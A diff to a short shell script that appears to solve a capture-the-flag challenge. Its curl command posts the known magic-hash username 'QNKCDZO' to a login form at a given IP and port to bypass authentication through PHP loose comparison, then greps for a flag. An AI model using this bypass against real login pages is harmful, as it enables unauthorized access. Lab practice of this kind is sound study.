@@ -16,10 +16,7 @@ then
     echo $0" <ip> <port>"
     exit 1
 else
-    URL=$1':'$2
+    URL='http://'$1':'$2
 fi
-
-
-# Defaced Website
 
 curl $URL -s -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=QNKCDZO&password=&submit=Login' | grep SSS | xargs
